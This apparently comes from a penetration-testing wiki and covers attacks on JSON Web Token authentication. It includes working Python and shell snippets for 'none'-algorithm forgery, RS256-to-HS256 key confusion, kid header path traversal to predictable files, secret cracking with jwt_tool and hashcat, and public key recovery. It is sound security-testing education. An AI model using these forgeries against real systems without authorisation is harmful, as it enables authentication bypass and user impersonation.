---
authors: ShutdownRepo
category: web
---

# Insecure JSON Web Tokens

## Theory

Some web applications rely on JSON Web Tokens (JWTs) for stateless authentication and access control instead of stateful ones with traditional session cookies. Some implementations are insecure and allow attackers to bypass controls, impersonate users, or retrieve secrets.

## Practice

Testers need to find if, and where, the tokens are used. A JWT is a base64 string of at least 100 characters, made of three parts (header, payload, signature) separated by dot, and usually located in `Authorization` headers with the `Bearer` keyword. See the the following example.

```
Authorization: Bearer eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]
```

Once the tokens are found, testers need to assess their implementation's security by attempting some known attacks and flaws.

### Sensitive data

JWTs are just base64 encoded data. They may contain sensitive unencrypted information.

### Signature attack - None algorithm

Testers need to decode the token, change the algorithm to `None` (or `none`, `NONE`, `nOnE`) in the header, remove the signature, and send the modified token. Some applications are vulnerable to this attack since some support a None algorithm for signature.

This can be done in Python.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
new_token = jwt.encode(old_token_payload, key='', algorithm=None)
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

```python
import jwt
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key='', algorithm=None)
print(token)
```

### Signature attack - RS256 to HS256

If the algorithm used to sign the payload is RS256, testers can try to use HS256 instead. Instead of signing the JWT payload with a private key, using HS256 will make the web app sign it with a public key that can sometimes be easily obtained.

> [!TIP]
> Some applications re-use their TLS certificate for JWT operations. The TLS certificate's public key used by a server can be obtained with the following command.
> 
> ```bash
> echo | openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout > pubkey.pem
> ```

The following Python code can be used to identify if the web application is vulnerable to this attack.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
public_key = open('pubkey.pem', 'r').read()
new_token = jwt.encode(old_token_payload, key=public_key, algorithm='HS256')
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

> [!WARNING]
> The jwt library imported in the following Python code raises an exception when attempting to use an asymmetric key or x509 certificate as an HMAC secret. Testers need to install version 0.4.3 `pip/pip3 install pyjwt==0.4.3`.

```python
import jwt
public_key = open('pubkey.pem', 'r').read()
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key=public_key, algorithm='HS256')
print(token)
```

### Signature attack - KID header path traversal

The [kid](https://www.rfc-editor.org/rfc/rfc7515#section-4.1.4) (Key ID) is an optional parameter specified in the JWT header part to indicate the key used for signature validation in case there are multiple ones.

The structure of this ID is not specified and it can be any string value (case-sensitive).

The last part is interesting because, if the parameter is vulnerable to [directory traversal](directory-traversal.md), this would allow to perform path traversal and point to a file `path/file` with content we can guess or known somehow, and use its content as the value of the signing key.

> [!TIP]
> "[JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)" PortSwigger lab provides more insight on this technique.

> [!TIP]
> > There are a bunch of files in /sys that are basically flags. Like the flag that says if ftrace is enabled is either 0 or 1. So the attacker just creates 2 tokens with that as the key and one of them will work!
> >
> > _(By_ [_Intigriti_](https://twitter.com/intigriti) _on_ [_Twitter_](https://twitter.com/intigriti/status/1618653959752925184)_)_
> 
> The example mentioned above is located at `/proc/sys/kernel/ftrace_enabled`

> [!TIP]
> In some cases, using the trick above will not work, as the file is listed with a size of 0, and some apps could check that the signature file is not empty.
> 
> ```python
> >>> import os
> >>> os.path.getsize("/proc/sys/kernel/ftrace_enabled")
> 0
> ```
> 
> Alternatively, other file could be used:
> 
> * some have a content that rarely changes (e.g. old configuration files like`/etc/host.conf`, `/etc/xattr.conf`, ...)
> * some have a predictable content (e.g. `/etc/hostname`, JS files in `/var/www/html`, ...)
> * some return an empty string (e.g. `/dev/null`) effectively allowing to bypass the signature validation, meaning an empty key could be used for signature.


```python
import jwt, os
payload = {'key1':'value1', 'key2':'value2'}
with open("path/to/file", 'r') as file:
    data = file.read()
token = jwt.encode(payload, key=data, algorithm='HS256', headers={"kid": "../../../path/to/file"})
print(token)
```


> [!TIP]
> If Burp is used to craft the JWT token, a symmetric key with value of the `k` property in the JWT equal to `AA==` (base64 value of null byte) must be created.
> 
> The same secret value is to be used on [jwt.io](https://jwt.io/).

### Cracking the secret

When JWT uses `HMAC-SHA256`/`384`/`512` algorithms to sign the payload, testers can try to find the secret if weak enough.

[JWT tool](https://github.com/ticarpi/jwt_tool) (Python3) can be used for this purpose.


```bash
# crack the secret using dictionnary attack
jwt_tool.py -v -C -d $wordlist_file "$JWT_value"

# use the secret to tapmer (-T option) the token
# running this command will show up a menu to choose the value to tamper
# the result token will be signed with the submited secret using the specified singing algorithm "alg" (hs256/hs384/hs512 = HMAC-SHA signing).
jwt_tool.py -v -S $alg -p "$secret" -T "$JWT_value"
```


JWT secrets can also be cracked using hashcat (see the [AD credential cracking](../../ad/movement/credentials/cracking.md) page for more detailed info on how to use it).

```bash
hashcat --hash-type 16500 --attack-mode 0 $JWTs_file $wordlist_file
```

### Recovering the public key

In certain scenarios, public keys can be recovered when knowing one (for algos `ES256`, `ES384`, `ES512`) or two (for algos `RS256`, `RS384`, `RS512`) tokens.

This can be achieved with the following Python script : [JWT-Key-Recover](https://github.com/FlorianPicca/JWT-Key-Recovery)

## Resources

[https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)

[https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

[https://blog.imaginea.com/stateless-authentication-using-jwt-2/](https://blog.imaginea.com/stateless-authentication-using-jwt-2/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

[https://jwt.io/](https://jwt.io/)

[https://portswigger.net/web-security/jwt](https://portswigger.net/web-security/jwt)

[https://systemweakness.com/deep-dive-into-jwt-attacks-efc607858af6](https://systemweakness.com/deep-dive-into-jwt-attacks-efc607858af6)